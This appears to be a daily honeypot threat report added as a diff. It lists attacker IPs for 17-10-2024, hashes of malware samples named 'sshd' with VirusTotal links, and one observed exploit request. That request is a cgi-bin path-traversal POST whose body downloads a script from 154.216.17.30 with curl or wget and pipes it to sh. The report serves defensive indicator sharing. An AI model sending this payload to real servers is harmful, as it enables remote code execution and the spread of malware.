@@ -1,0 +1,37 @@
+Top 5 IPs for 17-10-2024 :
+
+111.67.196.131	
+220.122.91.84
+14.103.52.218
+14.29.227.102
+129.146.26.210
+
+Malware Observed:
+
+File name : sshd
+db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5
+https://www.virustotal.com/gui/file/db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5
+ 
+File name : sshd
+f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd
+https://www.virustotal.com/gui/file/f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd
+
+340c8464c2007ce3f80682e15dfafa4180b641d53c14201b929906b7b0284d87
+https://www.virustotal.com/gui/file/340c8464c2007ce3f80682e15dfafa4180b641d53c14201b929906b7b0284d87
+
+a049df7b58b1f52f9f2f74bef29ec994d955e8cbaeab9d6e76dadc1763fdfc52
+https://www.virustotal.com/gui/file/a049df7b58b1f52f9f2f74bef29ec994d955e8cbaeab9d6e76dadc1763fdfc52
+
+Commands/exploits observed :
+
+POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
+Accept: */*
+Connection: keep-alive
+Host: <Host IP>
+Upgrade-Insecure-Requests: 1
+User-Agent: Custom-AsyncHttpClient
+Content-Length: 103
+Content-Type: text/plain
+
+X=$(curl http://154.216.17.30/az ||wget http://154.216.17.30/az -O-); echo "$X" | sh -s apache.selfrep
+
